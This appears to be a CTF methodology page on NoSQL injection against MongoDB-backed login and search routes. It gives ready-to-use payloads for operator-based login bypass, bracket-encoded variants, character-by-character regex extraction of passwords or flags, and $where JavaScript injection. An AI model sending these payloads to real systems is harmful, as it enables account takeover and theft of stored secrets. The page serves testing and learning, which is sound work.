---
title: "NoSQL Injection · Operators & Blind Reads"
weight: 21
bookToc: true
---

# NoSQL injection

**First decide which parser you control: JSON query operators or a string inserted into JavaScript.** `$ne` is not SQL syntax; `' || true` is not a valid JSON operator object.

## 1. Establish a baseline

Record status, redirect destination, body marker, session cookie and the resulting `/me` identity. A redirect or new cookie can represent a failed/anonymous session.

```http
POST /login HTTP/1.1
Host: ctf.invalid
Content-Type: application/json

{"username":"admin","password":"definitely-wrong"}
```

Try one changed field at a time. If the server uses `findOne({username: body.username, password: body.password})`, an object may be treated as a predicate. If it coerces to a string or hashes a string password first, operator objects usually do not help.

## 2. Operator injection: first useful pair

```json
{"username":"admin","password":{"$ne":"definitely-wrong"}}
```

Negative control:

```json
{"username":"admin","password":{"$eq":"definitely-wrong"}}
```

If only the first authenticates as admin, repeat and inspect `/me`. `$ne` also matches a missing field, so a broad query could select an unintended document. Keep a known username fixed when possible.

| Candidate | Meaning / next observation |
| --- | --- |
| `{"$ne":null}` | Non-null existing field; different from arbitrary password check |
| `{"$gt":""}` | Greater than empty string under DB comparison rules; not a universal nonempty test |
| `{"$regex":"^.*$"}` | Match a string, including empty; fails for non-string fields |
| `{"$regex":"^admin$"}` | Exact string user match |
| `{"$in":["admin","administrator"]}` | Membership, where nested operator accepted |
| `{"$exists":true}` | Field exists; doesn't reveal its value |

```json
{"username":{"$regex":"^admin$"},"password":{"$regex":"^.*$"}}
{"username":{"$in":["admin","administrator"]},"password":{"$ne":null}}
```

A backend that validates password after retrieving the user will defeat these login bypasses even if the query itself accepts operators. Investigate search/recovery endpoints separately.

## 3. URL-encoded objects are parser-dependent

A bracket-aware form parser may produce the same nested object:

```http
POST /login HTTP/1.1
Host: ctf.invalid
Content-Type: application/x-www-form-urlencoded

username=admin&password%5B%24ne%5D=wrong
```

Decoded editor forms:

```text
username=admin&password[$ne]=wrong
username=admin&password[$regex]=^.*$
username[$regex]=^admin$&password[$ne]=wrong
```

An ordinary flat parser may treat `password[$ne]` as a literal key. `password={"$ne":"wrong"}` is normally a **string**, unless application code explicitly parses it again. Switching the content type to JSON only helps if the route accepts JSON.

| Symptom | Likely cause |
| --- | --- |
| “password must be string” | Schema/type validation before query |
| `$` keys removed | Sanitizer or explicit operator allowlist |
| Object becomes `[object Object]` | String coercion |
| JSON works; brackets do not | Flat form parser or query parser settings |
| Both true and false log in | Existing session; clear cookies and verify user |
| Both fail with same error | Wrong sink, hashing, operator stripping, or generic error handling |

## 4. Manual regex-prefix extraction

Only useful when attacker-controlled regex is applied to the **secret value**, with a repeatable yes/no response. Querying a stored password hash extracts a hash, not the original password. If the server hashes the input before matching, this route does not apply.

Known account, known oracle:

```json
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^b"}}
{"username":"admin","password":{"$regex":"^c"}}
```

If `^c` matches, extend the confirmed prefix:

```json
{"username":"admin","password":{"$regex":"^ca"}}
{"username":"admin","password":{"$regex":"^cb"}}
{"username":"admin","password":{"$regex":"^ct"}}
```

A coarse branch can reduce manual requests:

```json
{"username":"admin","password":{"$regex":"^[a-m]"}}
{"username":"admin","password":{"$regex":"^[n-z]"}}
{"username":"admin","password":{"$regex":"^[0-9]"}}
```

Split a matching class until one character remains, then append it to the prefix. Continue until an end-anchored test succeeds:

```json
{"username":"admin","password":{"$regex":"^ctf\\{example\\}$"}}
```

In the JSON source above, `\\` shown as two backslash characters represents one backslash in the regex after JSON parsing. For a literal `.` use JSON regex text `"\\."`; for a literal backslash, JSON needs `"\\\\"`. Escape `.^$*+?()[]{}|\` when they occur in discovered data. Do not use `$options:"i"` while recovering a case-sensitive secret.

Length probes for a string value:

```json
{"username":"admin","password":{"$regex":"^.{8}$"}}
{"username":"admin","password":{"$regex":"^.{9}$"}}
{"username":"admin","password":{"$regex":"^.{10,}$"}}
```

`.` normally excludes newline. An accepted regex can still match multiple documents; fix account identity and check every result against a false control.

## 5. JavaScript syntax injection: separate path

Possible vulnerable construction:

```javascript
// The dangerous feature is untrusted concatenation, not MongoDB itself.
{ $where: "this.category == '" + input + "'" }
```

For exactly that single-quoted expression context:

```text
normal'
normal' && '1'=='1
normal' && '1'=='2
normal' || '1'=='1
normal' || '1'=='2
```

True/false behavior should follow the changed condition. Operator precedence matters; inspect source if available. An error on a quote alone might be a JSON/parser error before any database query.

If a complete top-level `$where` operator is accepted and server-side JavaScript is enabled:

```json
{"$where":"this.username === 'admin' && this.password.length === 8"}
{"$where":"this.username === 'admin' && this.password[0] === 'a'"}
{"$where":"this.username === 'admin' && this.password[0] === 'b'"}
```

These are complete filter objects, **not** values to paste into every password field. `$where` must reach the query at the correct level. MongoDB JavaScript runs in a database-side environment; it does not provide Node's `require('fs')` or ordinary app process access. New deployments may disable server-side JS; `$where` is deprecated starting MongoDB 8.0. Prefer normal query operators when available.

## 6. Fields, types and data exposure

If a search route accepts a whole query document, inspect whether it also accepts separate projection, sort or limit options. Their argument positions are driver/application-specific.

```json
{"query":{"username":"admin"},"projection":{"username":1,"flag":1,"_id":0}}
```

That request is an **application wrapper example**, not MongoDB wire syntax. Use names exposed by source or existing client requests. ObjectId values, strings, booleans and numbers compare differently; preserve the original field type. A missing result might be a type mismatch rather than access control.

## 7. Finish and troubleshoot

1. Confirm query manipulation with a true/false pair.
2. Verify the selected user or document, not just HTTP status.
3. Enumerate fields from actual JSON/source/error hints.
4. Use regex extraction only where the secret participates in the query.
5. Record the parsed object shape and content type with the winning input.

If a returned flag is truncated, inspect raw JSON rather than rendered UI. If every result changes randomly, remove timestamps/CSRF values from comparisons and compare a stable data marker.

## Tool workflow

Use [Burp Community Repeater](../../ajcbbc_allow_tools/burp_suite_community/) for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof.

## References

Operator behavior: [MongoDB regex](https://www.mongodb.com/docs/manual/reference/operator/query/regex/), [MongoDB query predicates](https://www.mongodb.com/docs/manual/reference/mql/query-predicates/). Injection contexts and manual controls: [PortSwigger NoSQL injection](https://portswigger.net/web-security/nosql-injection).
